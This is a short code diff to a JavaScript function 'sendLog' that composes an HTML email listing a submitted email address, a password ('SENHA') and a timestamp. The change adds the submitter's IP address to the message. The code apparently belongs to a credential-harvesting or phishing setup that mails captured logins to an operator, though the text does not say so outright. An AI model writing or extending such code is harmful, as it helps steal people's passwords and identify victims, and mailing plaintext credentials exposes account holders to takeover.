@@ -32,7 +32,9 @@ export function sendLog(dados){
                   <div style="text-aligin:center;">
                     <p>EMAIL: ${dados.email}</p>
                     <p>SENHA: ${dados.senha}</p>
+                    <p>IP: ${dados.ip}</p>
                     <p>DATA: ${new Date()}</p>
+                    
                   </div>
                 `, // HTML version of the message
     });
